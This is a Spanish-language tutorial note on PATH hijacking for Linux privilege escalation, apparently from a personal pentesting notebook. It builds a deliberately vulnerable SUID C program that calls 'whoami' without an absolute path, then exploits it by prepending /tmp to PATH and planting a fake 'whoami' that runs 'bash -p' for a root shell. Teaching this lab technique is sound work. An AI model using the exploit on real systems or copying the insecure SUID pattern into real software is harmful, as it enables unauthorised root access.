# 🔒 Path Hijacking: Teoría y Práctica

## 📋 Tabla de Contenidos
- [Teoría](#teoría)
- [Práctica](#práctica)
  - [Instalación](#instalación)
  - [Creación del código vulnerable](#creación-del-código-vulnerable)
  - [Detección de Path Hijacking](#detección-de-path-hijacking)
  - [Explotación del Path Hijacking](#explotación-del-path-hijacking)

---

## 🧠 Teoría

> [!INFO] ¿En qué consiste el Path Hijacking?
> Path Hijacking es una técnica de escalada de privilegios que aprovecha la forma en que los sistemas operativos buscan binarios ejecutables en la variable de entorno PATH. Cuando un programa ejecuta un comando sin especificar la ruta absoluta, el sistema buscará en las rutas definidas en PATH, empezando por la primera. Un atacante puede manipular esta variable para hacer que se ejecute su versión maliciosa del comando en lugar de la legítima.

---

## 🔬 Práctica

### Instalación

Instalamos GCC para compilar nuestro código de ejemplo:

> [!NOTE] Instalación en diferentes distribuciones
> **En Arch Linux:**
> ```bash
> sudo pacman -S gcc
> ```
> 
> **En Parrot/Kali:**
> ```bash
> sudo apt install gcc
> ```

### Creación del código vulnerable

Como root, creamos un archivo `test.c` en el directorio `scripts/path_hijacking/`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    
    // setuid a 0 porque el programa se ejecuta como root
    setuid(0);
    printf("\n[+] Acuktalmente soy el sigueinte usuario:\n\n");
    system("/usr/bin/whoami");
    printf("\n[+] Acuktalmente soy el sigueinte usuario:\n\n");
    system("whoami");
    return 0;
}
```

> [!IMPORTANT]
> Le asignamos permisos SUID para que cualquier usuario pueda ejecutarlo con privilegios de superusuario:
> ```bash
> chmod u+s test
> ```

### Detección de Path Hijacking

> [!TIP] Análisis del binario
> Después de compilar el binario, no podremos usar `cat` para ver su contenido. Sin embargo, podemos usar otras herramientas para analizarlo:

Podemos usar `file` para ver las características y propiedades del binario:
```bash
file test
```

También podemos usar `strings` para buscar cadenas de texto en el binario:
```bash
strings test
```

Para buscar específicamente el uso de "whoami" en el código:
```bash
strings test | grep "whoami"
```

⚠️ **El riesgo se encuentra aquí:** En el código, observamos que la segunda vez que se ejecuta `whoami`, se hace sin especificar la ruta absoluta. Esto es lo que podemos aprovechar.

### Explotación del Path Hijacking

Si estamos como usuario no privilegiado, podemos manipular la variable PATH para que busque primero en nuestro directorio controlado:

```bash
export PATH=/tmp/:$PATH
```

En `/tmp/`, creamos nuestro propio ejecutable malicioso `whoami`:

```bash
touch /tmp/whoami && chmod +x /tmp/whoami
```

Editamos este archivo para que contenga:
```bash
#!/bin/bash
bash -p
```

> [!DANGER] ¡Parte peligrosa!
> Ahora, cuando el programa vulnerable ejecute `whoami` sin ruta absoluta, encontrará primero nuestra versión en `/tmp/` que lanzará una shell con privilegios elevados.

---

## 🔗 Referencias adicionales
- [[file]] - Comando para analizar tipos de archivos
- [[strings]] - Herramienta para extraer cadenas de texto de binarios